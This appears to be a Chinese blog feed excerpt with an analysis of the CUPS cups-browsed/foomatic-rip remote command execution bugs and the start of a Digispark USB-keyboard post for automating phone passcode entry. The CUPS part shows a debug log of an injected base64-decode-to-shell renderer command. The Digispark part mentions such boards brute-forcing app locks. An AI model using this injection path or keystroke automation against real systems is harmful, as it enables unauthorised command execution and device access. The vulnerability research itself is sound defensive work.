漏洞成因</h2><p>本漏洞涉及了cups 打印系统中的 cups-browsed（建立ipp协议连接）、libcupsfilters(获取ipp属性)、libppd(生成ppd文件)、cup-filters(调用过滤器)、foomatic-rip（转换打印格式后进行打印业务) 多个组件。</p><p>首先在 cups-browsed 会调用 libcupsfilters 库中的 cfGetPrinterAttributes5 在从打印机读取IPP属性之后，没有清除这些属性，而是在后面的调用 libppd 库中的 ppdCreatePPDFromIPP2 会创建ppd 缓冲区后生成 ppd 文件，将这些打印机IPP属性保存在 &#x2F;etc&#x2F;cups&#x2F;ppd&#x2F; 目录中以供打印作业时调用读取。并且当用户调用打印机来进行打印作业的时候，cups系统会读取ppd 文件内的属性，并且会根据cupsfilter 提供的value 来选择对应的过滤器 foomatic-rip，foomatic-rip 会读取ppd文件中的 FoomaticRIPCommandLine 值并且调用 &#x2F;bin&#x2F;shell 来执行命令。</p><p>虽然漏洞的评分是9.9分，但是触发条件比较特殊，需要受害者打印文件的时候，选择恶意的打印机，才会触发嵌入在ppd文件恶意命令，执行任意命令。</p><h2 id="0x04-漏洞分析"><a href="#0x04-漏洞分析" class="headerlink" title="0x04 漏洞分析"></a>0x04 漏洞分析</h2><p>根据具体的CVE-2024-47076、CVE-2024-47175、CVE-2024-47176、CVE-2024-47177 来看，漏洞的核心在于CUPS组件缺乏输入验证，攻击者可以利用互联网打印协议(IPP)，将需要的打印机IPP属性保存在PostScript打印机描述（PPD）文件中，而CUPS 将会使用ppd文件来描述打印机属性，在使用IPP协议进行打印时，客户端会根据PPD文件中的信息配置打印作业。如果PPD文件中的一些属性attr 被攻击者注入了恶意命令，这些被操纵的ppd文件可让攻击者在触发打印时执行任意命令。</p><p>具体来说，IPP协议是一种应用层协议，用于通过网络发送和接收打印作业，允许客户端和打印机之间通信，这些通信包括发送有关打印机状态（卡纸、墨水不足等）和任何作业状态的信息，所有主流操作系统都支持IPP协议，包括Windows、macOS、Linux。</p><p>当局域网中有一个台打印机上线并可用时，打印机会通过DNS广播有关打印机的数据包，其中包括统一资源标识符(URI)，以及表明PostScript语言和设备的UUID。<br><img src="/25__cups_browser_%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A.assets/image-20241010145442708.png"><br>在linux 系统中（目前只测试了Linux）cups 会发送IPP request（GET-Printer-Attributes）从目标打印机中获取所有的 attributes 并保存到 &#x2F;etc&#x2F;cups&#x2F;ppd&#x2F;目录中。</p><p>首先从cups-browsed 组件开始分析，cups-browsed 是cups系统的一部分，并且会监听631端口，绑定之后就会调用recvfrom()函数读取数据包并检查后解析其解析的格式为 “%x%x%1023s” ，在packet数据包中读取两个十六进制数和一个字符串。<br><img src="/25__cups_browser_%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A.assets/image-20241010155144375.png"><br>在此之后调用found_cups_printer() 函数来通过url 找到打印机的资源。其中会调用examine_discovered_printer_record() 函数，<br><img src="/25__cups_browser_%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A.assets/image-20241010165854640.png"><br>最后调用create_remote_printer_entry() 函数创建一个新的打印机队列，并且会创建pdd文件，对于远程打印机，创建本地打印机队列并且从读取远程的pdd文件，从而保证能够通过pdd文件来驱动远程打印机。<br><img src="/25__cups_browser_%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A.assets/image-20241010161821584.png"><br>cfGetPrinterAttributes() 函数的原型在cups系统中的libcupsfilters 库(<a href="https://github.com/OpenPrinting/libcupsfilters/blob/master/cupsfilters/ipp.c)%E4%B8%AD%EF%BC%8C%E9%80%9A%E8%BF%87http%E5%A5%97%E6%8E%A5%E5%AD%97%E8%BF%9E%E6%8E%A5%EF%BC%8C%E7%84%B6%E5%90%8E%E8%B0%83%E7%94%A8">https://github.com/OpenPrinting/libcupsfilters/blob/master/cupsfilters/ipp.c)中，通过http套接字连接，然后调用</a> cupsDoRequest() 函数来获取目标打印机所有的attribute, cupsDoRequest() 函数在 <a href="https://www.cups.org/doc/cupspm.html">https://www.cups.org/doc/cupspm.html</a> </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// Connect to the server if not already done</span><br>  <span class="hljs-keyword">if</span> (http_printer == <span class="hljs-literal">NULL</span>)<br>  &#123;<br>    have_http = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> ((http_printer =<br> <span class="hljs-built_in">httpConnect</span>(host_name, host_port, <span class="hljs-literal">NULL</span>, AF_UNSPEC,<br>     encryption, <span class="hljs-number">1</span>, <span class="hljs-number">3000</span>, <span class="hljs-literal">NULL</span>)) == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-built_in">log_printf</span>(cf_get_printer_attributes_log,<br> <span class="hljs-string">&quot;get-printer-attributes: Cannot connect to printer with URI %s.\n&quot;</span>,<br> uri);<br>      <span class="hljs-keyword">if</span> (uri) <span class="hljs-built_in">free</span>(uri);<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>  &#125;<br>省略...<br>    <span class="hljs-built_in">ippAddString</span>(request, IPP_TAG_OPERATION, IPP_TAG_URI, <span class="hljs-string">&quot;printer-uri&quot;</span>, <span class="hljs-literal">NULL</span>,<br> uri);<br>    <span class="hljs-built_in">ippAddStrings</span>(request, IPP_TAG_OPERATION, IPP_TAG_KEYWORD,<br>  <span class="hljs-string">&quot;requested-attributes&quot;</span>, pattrs_size,<br>  <span class="hljs-literal">NULL</span>, pattrs);<br><br>    response = <span class="hljs-built_in">cupsDoRequest</span>(http_printer, request, resource);<br>    ipp_status = <span class="hljs-built_in">cupsGetError</span>();<br></code></pre></td></tr></table></figure><p>具体的请求数据包如下所示：<br><img src="/25__cups_browser_%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A.assets/image-20241010171016854.png"></p><p>cups-browsed 在获取到 ipp 协议的属性之后，会调用update_cups_queues() 函数更新打印队列的信息，其中会进入到 STATUS_TO_BE_CREATED 分支中开启一个线程调用create_queue()函数来更新队列。STATUS_TO_BE_CREATED 在前面的create_remote_printer_entry() 函数中会配置打印机任务状态。<br><img src="/25__cups_browser_%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A.assets/image-20241010175546161.png"><br>create_queue()函数在执行的过程中是获取不到ppdfile的，因此会自己调用ppdCreatePPDFromIPP2() 生成ppd文件，ppd文件是只postScript打印机描述文件，文件内的属性描述了每个打印机的功能，cups 使用ppd 文件来支持打印机特定的功能和智能过滤。<br><img src="/25__cups_browser_%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A.assets/image-20241010180628350.png"><br>详细的数据包如下<br><img src="/25__cups_browser_%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A.assets/image-20241014161716584.png"><br>ppdCreatePPDFromIPP2()  函数来自于libppd (<a href="https://github.com/OpenPrinting/libppd/blob/master/ppd/ppd-generator.c">https://github.com/OpenPrinting/libppd/blob/master/ppd/ppd-generator.c</a> ），及主要的功能就是创建一个标准的 pdd 文件，并且将远程打印机提供的attr 写入到pdd文件。<br><img src="/25__cups_browser_%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A.assets/image-20241010181235723.png"><br>生成的ppd文件存在于&#x2F;etc&#x2F;cups&#x2F;ppd&#x2F; 目录中，临时文件在打印机任务结束之后，会自动清除。<br><img src="/25__cups_browser_%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A.assets/image-20241010181947035.png"><br>在ppd文件中，我们可以看到 cupsFilter2 和 FoomaticRIPCommandLine 这两个是pdd 文件的属性。其中cupsFilter2 的使用手册如下所示：<br><img src="/25__cups_browser_%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A.assets/image-20241011142005028.png"><br>program 参数的作用是调用过滤器（所有能被cups 使用的过滤器在 &#x2F;usr&#x2F;lib&#x2F;cups&#x2F;filter）来处理对待打印文件格式的转换，这里使用的是 foomatic-rip 过滤器，另外cups为了提升兼容性，cupsFilter 也是做与cupsFilter2一样的工作，同样对输入没有任何校验。<br>foomatic-rip 能将PostScript 和 PDF（以及其他文件格式）从标准输入转换为打印机的本机语言，这里的转换手段是通过读取ppd 中的描述来构建渲染器，进行后续的打印作业。</p><p>foomatic-rip 是如何能执行  FoomaticRIPCommandLine 命令的呢？<br>有关FoomaticRIPCommandLine 属性配置如下所示，这个属性定义的命令会被foomatic-rip 的渲染器执行。<br><img src="/25__cups_browser_%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A.assets/image-20241011145233374.png"><br>花了一点时间对 foomatic-rip 源码进行审计，并且开启调试运行打印作业，完整的输出信息如下所示：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">DEBUG: Color Manager: Invalid printer name.<br><span class="hljs-string">&#x27;CM Color Calibration&#x27;</span> Mode <span class="hljs-keyword">in</span> SPOOLER-LESS: Off<br>foomatic-rip <span class="hljs-built_in">version</span> <span class="hljs-number">1.28</span><span class="hljs-number">.17</span> running...<br>called <span class="hljs-keyword">with</span> arguments: <span class="hljs-string">&#x27;-P&#x27;</span>, <span class="hljs-string">&#x27;hhhh1&#x27;</span>, <span class="hljs-string">&#x27;-v&#x27;</span>, <span class="hljs-string">&#x27;--ppd&#x27;</span>, <span class="hljs-string">&#x27;hhhh1.ppd&#x27;</span>, <span class="hljs-string">&#x27;./exx.pdf&#x27;</span><br>Parsing PPD <span class="hljs-built_in">file</span> ...<br>Added option PageSize<br>...<br>Spooler: direct<br>Printer: hhhh1<br>Shell: /bin/sh<br>PPD <span class="hljs-built_in">file</span>: hhhh1.ppd<br>...<br>Starting renderer <span class="hljs-keyword">with</span> <span class="hljs-keyword">command</span>: <span class="hljs-string">&quot;echo dG91Y2ggL3RtcC9oaGhoaGho|base64 -d|sh #&quot;</span><br>Starting <span class="hljs-built_in">process</span> <span class="hljs-string">&quot;kid3&quot;</span> (generation <span class="hljs-number">1</span>)<br>Starting <span class="hljs-built_in">process</span> <span class="hljs-string">&quot;kid4&quot;</span> (generation <span class="hljs-number">2</span>)<br>Starting <span class="hljs-built_in">process</span> <span class="hljs-string">&quot;renderer&quot;</span> (generation <span class="hljs-number">2</span>)<br>...<br>Killing kid3<br></code></pre></td></tr></table></figure><p>可以看到调用了 &#x2F;bin&#x2F;shell 来执行command，根据其中的<code>Starting renderer with command</code> 定位到了 get_renderer_handle函数，会启动exec_kid3来执行command。<br><img src="/25__cups_browser_%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A.assets/image-20241011140555307.png"><br>在exec_kid3() 函数最终中调用 run_system_process() 函数来执行命令。执行命令的流程在process.c 文件内</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livescript">run_system_process<span class="hljs-function"><span class="hljs-params">( command )</span> --&gt;</span><br>start_system_process<span class="hljs-function"><span class="hljs-params">(command)</span> --&gt;</span><br>_start_process<span class="hljs-function"><span class="hljs-params">(exec_command,command)</span> --&gt;</span> <br>exec_command<span class="hljs-function"><span class="hljs-params">(command)</span> --&gt;</span> <br>  execl(command)<br></code></pre></td></tr></table></figure><p>在分析的过程中，最终通过传入 FoomaticRIPCommandLine 命令参数，然后调用shell 来进行执行，于是在CVE仓库看看是否有其他符合条件的漏洞编号，我发现存在CVE-2011-2694、CVE-2011-2697这两个漏洞都是和本篇分析的漏洞详情相似，均是将载荷写入恶意的.ppd 文件中，进而造成远程命令执行。<br><img src="/25__cups_browser_%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A.assets/image-20241015104733238.png"><br>按照对FoomaticRIPCommandLine 修复的情况来看，仅仅是不提供这个 –ppd参数选项。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">foomaticrip.c: <span class="hljs-keyword">SECURITY</span> FIX: It was possible <span class="hljs-keyword">to</span> make CUPS executing    arbitrary commands <span class="hljs-keyword">as</span> the <span class="hljs-keyword">system</span> <span class="hljs-keyword">user</span> &quot;lp&quot; <span class="hljs-keyword">when</span> foomatic-rip was used <span class="hljs-keyword">as</span> CUPS <span class="hljs-keyword">filter</span>. Fixed <span class="hljs-keyword">by</span> <span class="hljs-keyword">not</span> parsing named <span class="hljs-keyword">options</span> (<span class="hljs-keyword">like</span> &quot;--ppd lj.ppd&quot;) <span class="hljs-keyword">when</span> foomatic-rip <span class="hljs-keyword">is</span> running <span class="hljs-keyword">as</span> CUPS <span class="hljs-keyword">filter</span>, <span class="hljs-keyword">as</span> CUPS does <span class="hljs-keyword">not</span> supply named <span class="hljs-keyword">options</span> <span class="hljs-keyword">to</span> their filters.<br></code></pre></td></tr></table></figure><p>但实际上在cups 打印系统中，foomatic-rip组件依旧可以使用 –pdd option 来指定.ppd 文件。<br><img src="/25__cups_browser_%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A.assets/image-20241015140015996.png"></p><h2 id="0x05-缓解措施"><a href="#0x05-缓解措施" class="headerlink" title="0x05 缓解措施"></a>0x05 缓解措施</h2><ul><li>禁用并卸载该<code>cups-browsed</code>服务。例如，请参阅<a href="https://www.redhat.com/en/blog/red-hat-response-openprinting-cups-vulnerabilities">Red Hat</a>和<a href="https://ubuntu.com/blog/cups-remote-code-execution-vulnerability-fix-available">Ubuntu</a>的建议。</li><li>确保您的 CUPS 软件包已更新至适用于您的发行版的最新版本。</li><li>如果无法更新，请阻止<code>631</code>来自可能受影响的主机的 UDP 端口和 DNS-SD 流量</li></ul><h2 id="0x06-思考总结"><a href="#0x06-思考总结" class="headerlink" title="0x06 思考总结"></a>0x06 思考总结</h2><p>那么为什么在cups系统中并没有将这个存在执行命令的参数FoomaticRIPCommandLine 给修复呢，或者说设定一些对用户输入信息的校验，按照evilsocket 的说法是，cups开发人员认为如果将这个问题修复了，那将会影响老版本打印机的使用，修复可能会破坏打印机的驱动程序。因此为了维护老版本打印机型号的使用，不得不将foomatic-rip 组件保留下来，只能建议用户在配置打印机的时候，不要去使用foomatic-rip 组件。<br>此外，在cup-filters库中，有研究人员提交了一个远程命令执行漏洞（CVE-2023-24805），截至目前，该漏洞仍处于” A fix is worked on currently”的状态，可见一斑。</p><p>在许多系统或产品中，当影响面广泛且供应链错综复杂时，如果某个环节出现安全漏洞，安全研究人员通常会要求开发者立即启动应急响应策略，以便及时修复并发布缓解措施。然而，对于企业、组织、开发者甚至用户来说，需要考虑的因素则更加复杂。例如，更换组件、协调修复漏洞的相关部门以及上下游供应商所涉及的成本问题，牵一发而动全身的改动代码是否产生其他代码问题，修复漏洞是否会影响产品生态中其他组件的正常维护和使用。此外，类似于 CUPS 的情况，在修复漏洞后，可能会对大量旧款、不再维护的打印机产品的使用造成影响。因此，修复漏洞的过程往往面临诸多权衡和困境，迫使各方在安全与可用性之间寻求平衡。</p><p>在网络安全领域，安全研究人员往往持有一种单向的风险观。在发现漏洞后，他们希望能获得更多的关注和响应，并普遍认为漏洞存在的风险是负面的。然而，修复这些漏洞的过程可能会影响实际用户对产品的使用体验，导致用户未能真正体会到漏洞修复所带来的安全提升。这种情况使得安全修复与用户体验之间的平衡变得复杂，往往需要在保障安全和维持良好体验之间做出权衡。</p><p>“在网络安全领域，我们常常忘记，我们的业务不是消除风险，而是管理风险”<br><img src="/25__cups_browser_%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A.assets/image-20241015143501339.png"></p><h2 id="0x07-有关参考"><a href="#0x07-有关参考" class="headerlink" title="0x07 有关参考"></a>0x07 有关参考</h2><p><a href="https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/">https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/</a><br><a href="https://www.cups.org/doc/spec-ppd.html#cupsFilter2">https://www.cups.org/doc/spec-ppd.html#cupsFilter2</a><br><a href="https://refspecs.linuxbase.org/LSB_3.2.0/LSB-Printing/LSB-Printing/ppdext.html">https://refspecs.linuxbase.org/LSB_3.2.0/LSB-Printing/LSB-Printing/ppdext.html</a><br><a href="https://linux.die.net/man/1/foomatic-rip">https://linux.die.net/man/1/foomatic-rip</a><br><a href="https://github.com/jschyz/blog/issues/7">https://github.com/jschyz/blog/issues/7</a><br><a href="https://blog.csdn.net/limelove/article/details/121988838">https://blog.csdn.net/limelove/article/details/121988838</a><br><a href="https://www.cups.org/doc/network.html">https://www.cups.org/doc/network.html</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Digispark_实现键盘和鼠标应用</title>
    <link href="/2024/10/27/53__Digispark_%E5%AE%9E%E7%8E%B0%E9%94%AE%E7%9B%98%E5%92%8C%E9%BC%A0%E6%A0%87/"/>
    <url>/2024/10/27/53__Digispark_%E5%AE%9E%E7%8E%B0%E9%94%AE%E7%9B%98%E5%92%8C%E9%BC%A0%E6%A0%87/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>在日常对设备进行安全测试的过程中，可能会遇到需要频繁的手动输入密码情况，比如在对智能设备的人脸生物识别研究工作中的时候，发现设备的人脸解锁失败几次之后，就需要人工手动的去输入设备锁屏密码。为了解决这个问题，还专门去参观了那些制作仿真人脸头模绕过手机人脸识别厂商的实验室，发现虽然他们可以自动化的设置人脸生物识别实验室环境的亮度，头模角度，光线。但依旧没有解决每几次识别失败就需要输入密码以开启设备的步骤，非常影响效率和测试自动化的效果，因此需要一种能自动化输入设备锁屏密码的解决办法。</p><p>于是偶然在一则报道中，看到有人用一个特别小巧的，和硬币一般大小的开发板来爆破一些移动应用安全设置中的锁定密码，比如私密相册等，经过简单的检索之后，了解到是Digispark，那么这个廉价的板子可以用于解决人脸解锁失败后需要手动输入密码的问题。只要思想不滑坡，方法总比困难多。</p><h2 id="0x02-关于Digispark"><a href="#0x02-关于Digispark" class="headerlink" title="0x02 关于Digispark"></a>0x02 关于Digispark</h2><p>Digispark是一种基于ATtiny85微控制器的微型开发板，通常用于创建小型嵌入式项目和原型设计。它由Digistump公司推出，是一个低成本、小巧的开发工具，适用于简单的电子项目、物联网设备、小型自动化等应用。 <br><a href="https://github.com/matteocelani/Digispark">https://github.com/matteocelani/Digispark</a></p><p>Digispark开发板的特点包括： </p><ol><li>微型尺寸： Digispark非常小巧，形状大小尺寸类似于一个USB插头，可以方便地连接到计算机或其他设备。 </li><li>基于ATtiny85： Digispark使用了ATtiny85微控制器，具有8KB的闪存和512字节的SRAM，适合一些小规模项目。 </li><li>USB接口： Digispark通过USB接口进行供电和通信，可以作为USB设备与计算机通信，也可以通过USB进行编程。 </li><li>Arduino编程语言和库来开发项目。 </li><li>开源： Digispark的设计是开源的，用户可以访问其GitHub仓库获取相关资料和资源。 </li><li>适用于简单项目： 由于资源有限，Digispark适用于一些较为简单的嵌入式项目，例如小型传感器应用、自动化控制等。</li></ol><p> </p><p>Digispark 开发板 在淘宝里买来只需要要几十块钱，就可以拥有它，如下图所示：<br><img src="/53__Digispark_%E5%AE%9E%E7%8E%B0%E9%94%AE%E7%9B%98%E5%92%8C%E9%BC%A0%E6%A0%87.assets/image-20241027220341340.png"></p><p>另外对于PC或者手机来说，USB 设备的接入是不需要认证都可以用的，因此可以使用Digispark 来模拟鼠标和键盘做一些力所能及的事情。</p><h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><p>系统： windows10<br>软件： Arduino 18.05</p><p>1、下载Digispark 兼容板的描述文件：<a href="http://digistump.com/package_digistump_index.json" title="http://digistump.com/package_digistump_index.json">http://digistump.com/package_digistump_index.json</a> 直接在“首选项” – &gt; “开发板管理器网址”的输入框中填入上面的URL。<br><img src="/53__Digispark_%E5%AE%9E%E7%8E%B0%E9%94%AE%E7%9B%98%E5%92%8C%E9%BC%A0%E6%A0%87.assets/image-20230715184200148.png"></p><p>然后下载开发板需要的包<br>在上方的菜单中找到工具-&gt;开发板-&gt;开发板管理器，在“类型”下选择“贡献”一栏，下载并安装下图中所示的包“Digistmup AVR Boards”。注意<strong>：下载时请科学上网，</strong>否则速度可能会很慢。<br><img src="/53__Digispark_%E5%AE%9E%E7%8E%B0%E9%94%AE%E7%9B%98%E5%92%8C%E9%BC%A0%E6%A0%87.assets/image-20230715184834722.png"></p><p>下载驱动<br><a href="https://link.zhihu.com/?target=https://github.com/digistump/DigistumpArduino/releases/download/1.6.7/Digistump.Drivers.zip">https://link.zhihu.com/?target=https%3A//github.com/digistump/DigistumpArduino/releases/download/1.6.7/Digistump.Drivers.zip</a><br>然后插上板子，在设备管理器中可以看到开发板<br><img src="/53__Digispark_%E5%AE%9E%E7%8E%B0%E9%94%AE%E7%9B%98%E5%92%8C%E9%BC%A0%E6%A0%87.assets/image-20230715185233418.png"></p><p>代码上传的时候，当出现整个的时候，记得要热插拔一次（热插拔就是物理上拔出来然后插进去）<br><img src="/53__Digispark_%E5%AE%9E%E7%8E%B0%E9%94%AE%E7%9B%98%E5%92%8C%E9%BC%A0%E6%A0%87.assets/image-20230715190718532.png"></p><h2 id="Digispark-键盘库使用"><a href="#Digispark-键盘库使用" class="headerlink" title="Digispark 键盘库使用"></a>Digispark 键盘库使用</h2><p>当你正常将环境搭建完毕之后，可以在 DigiKeyboard.h中看到有关键盘的API 函数以供使用。但常见的API 如下。</p><h3 id="API-函数原型"><a href="#API-函数原型" class="headerlink" title="API 函数原型"></a>API 函数原型</h3><h4 id="delay-函数"><a href="#delay-函数" class="headerlink" title="delay() 函数"></a>delay() 函数</h4><p>void delay(long milli)   延迟，毫秒为单位</p><h4 id="sendKeyStroke-函数"><a href="#sendKeyStroke-函数" class="headerlink" title="sendKeyStroke() 函数"></a>sendKeyStroke() 函数</h4><p>void sendKeyStroke(byte KeyStroke)  发送按键并释放</p><p>void sendKeyStroke(byte KeyStroke, byte modifiers) 发送带有关联按键和释放，第一个参数是主键，第二个按键是组合键。</p><h4 id="sendKeyPress-函数"><a href="#sendKeyPress-函数" class="headerlink" title="sendKeyPress() 函数"></a>sendKeyPress() 函数</h4><p>void sendKeyPress(byte KeyPress)  发送按键但不释放，若要释放再次调用此函数并参数KeyPress &#x3D;0</p><p>void sendKeyPress(byte KeyPress, byte modifiers)  发送带有关联按键，但不释放，若要释放需再次调用此函数并且参数KeyPress &#x3D; 0</p><p>测试代码</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-meta">#include &quot;DigiKeyboard.h&quot;</span><br><br><span class="hljs-meta"># 打开微信输入</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">setup</span>()</span> &#123;<br>  <span class="hljs-comment">// put your setup code here, to run once:</span><br>  DigiKeyboard.delay(<span class="hljs-number">2000</span>); <br>  <br>  DigiKeyboard.sendKeyStroke(KEY_W,MOD_ALT_LEFT);   <span class="hljs-comment">//打开微信快捷键</span><br>  DigiKeyboard.delay(<span class="hljs-number">300</span>);<br>  DigiKeyboard.println(<span class="hljs-string">&quot;helloworld &quot;</span>);<br>&#125;<br> <br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">loop</span>()</span> &#123;<br>  <span class="hljs-comment">// put your main code here, to run repeatedly:</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="键盘键码"><a href="#键盘键码" class="headerlink" title="键盘键码"></a>键盘键码</h4><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs tap">键 键码 <br>A <span class="hljs-number"> 65 </span>B<span class="hljs-number"> 66 </span>C<span class="hljs-number"> 67 </span>D<span class="hljs-number"> 68 </span>E<span class="hljs-number"> 69 </span>F<span class="hljs-number"> 70 </span>G<span class="hljs-number"> 71 </span>H<span class="hljs-number"> 72 </span>I<span class="hljs-number"> 73 </span>J<span class="hljs-number"> 74 </span>K<span class="hljs-number"> 75 </span>L<span class="hljs-number"> 76 </span>M<span class="hljs-number"> 77 </span>N<span class="hljs-number"> 78 </span>O<span class="hljs-number"> 79 </span>P<span class="hljs-number"> 80 </span>Q<span class="hljs-number"> 81 </span>R<span class="hljs-number"> 82 </span>S<span class="hljs-number"> 83 </span>T<span class="hljs-number"> 84 </span>U<span class="hljs-number"> 85 </span>V<span class="hljs-number"> 86 </span>W<span class="hljs-number"> 87 </span>X<span class="hljs-number"> 88 </span>Y<span class="hljs-number"> 89 </span>Z<span class="hljs-number"> 90 </span>0<span class="hljs-number"> 48 </span>1<span class="hljs-number"> 49 </span>2<span class="hljs-number"> 50 </span>3<span class="hljs-number"> 51 </span>4<span class="hljs-number"> 52 </span>5<span class="hljs-number"> 53 </span>6<span class="hljs-number"> 54 </span>7<span class="hljs-number"> 55 </span>8<span class="hljs-number"> 56 </span>9<span class="hljs-number"> 57 </span>回车键<span class="hljs-number"> 13 </span>制表键<span class="hljs-number"> 9 </span>空格键<span class="hljs-number"> 32 </span>退格键<span class="hljs-number"> 8 </span>删除键<span class="hljs-number"> 46 </span>逗号键<span class="hljs-number"> 44 </span>句点键<span class="hljs-number"> 46 </span>上箭头键<span class="hljs-number"> 38 </span>下箭头键<span class="hljs-number"> 40 </span>左箭头键<span class="hljs-number"> 37 </span>右箭头键<span class="hljs-number"> 39 </span>功能键 F1<span class="hljs-number"> 112 </span>功能键 F2<span class="hljs-number"> 113 </span>功能键 F3<span class="hljs-number"> 114 </span>功能键 F4<span class="hljs-number"> 115 </span>功能键 F5<span class="hljs-number"> 116 </span>功能键 F6<span class="hljs-number"> 117 </span>功能键 F7<span class="hljs-number"> 118 </span>功能键 F8<span class="hljs-number"> 119 </span>功能键 F9<span class="hljs-number"> 120 </span>功能键 F10<span class="hljs-number"> 121 </span>功能键 F11<span class="hljs-number"> 122 </span>功能键 F12 123<br>--------------------------------------<span class="language-yaml"><span class="hljs-meta">---</span></span><br><span class="language-yaml"><span class="hljs-bullet">-</span> <span class="hljs-string">`KEY_ENTER`:</span> <span class="hljs-string">回车键</span></span><br><span class="language-yaml"><span class="hljs-bullet">-</span> <span class="hljs-string">`KEY_TAB`:</span> <span class="hljs-string">制表键</span></span><br><span class="language-yaml"><span class="hljs-bullet">-</span> <span class="hljs-string">`KEY_ESC`:</span> <span class="hljs-string">Esc键</span></span><br><span class="language-yaml"><span class="hljs-bullet">-</span> <span class="hljs-string">`KEY_SPACE`:</span> <span class="hljs-string">空格键</span></span><br><span class="language-yaml"><span class="hljs-bullet">-</span> <span class="hljs-string">`KEY_BACKSPACE`:</span> <span class="hljs-string">退格键</span></span><br><span class="language-yaml"><span class="hljs-bullet">-</span> <span class="hljs-string">`KEY_DELETE`:</span> <span class="hljs-string">删除键</span></span><br><span class="language-yaml"><span class="hljs-bullet">-</span> <span class="hljs-string">`KEY_ARROW_UP`:</span> <span class="hljs-string">上箭头键</span></span><br><span class="language-yaml"><span class="hljs-bullet">-</span> <span class="hljs-string">`KEY_ARROW_DOWN`:</span> <span class="hljs-string">下箭头键</span></span><br><span class="language-yaml"><span class="hljs-bullet">-</span> <span class="hljs-string">`KEY_ARROW_LEFT`:</span> <span class="hljs-string">左箭头键</span></span><br><span class="language-yaml"><span class="hljs-bullet">-</span> <span class="hljs-string">`KEY_ARROW_RIGHT`:</span> <span class="hljs-string">右箭头键</span></span><br><span class="language-yaml"><span class="hljs-bullet">-</span> <span class="hljs-string">`KEY_F1`</span> <span class="hljs-string">到</span> <span class="hljs-string">`KEY_F12`:</span> <span class="hljs-string">功能键</span> <span class="hljs-string">F1</span> <span class="hljs-string">到</span> <span class="hljs-string">F12</span></span><br></code></pre></td></tr></table></figure><h2 id="模拟键盘输入（用于手机）"><a href="#模拟键盘输入（用于手机）" class="headerlink" title="模拟键盘输入（用于手机）"></a>模拟键盘输入（用于手机）</h2><p>首先对于手机来说，真实键盘按键输入密码的顺序如：</p><p>space – space — 密码 — enter —密码 — 